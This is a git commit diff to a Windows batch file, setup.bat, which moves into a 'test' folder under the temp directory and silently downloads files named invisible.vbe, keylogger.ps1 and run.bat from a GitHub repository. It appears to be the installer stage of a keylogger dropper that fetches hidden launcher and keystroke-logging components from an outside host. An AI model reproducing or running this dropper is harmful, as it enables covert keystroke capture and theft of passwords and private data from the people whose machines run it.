3ee3a80e60cd27ebebd88fd68b6c01c4b8c81826
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-09-10 16:46:09 +0200

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,5 +1,9 @@
 @echo off
 cd %temp%
+if not exist test\ (
+  mkdir test
+)
+cd test
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/invisible.vbe -o i.vbe
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/keylogger.ps1 -o p.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/run.bat -o r.bat
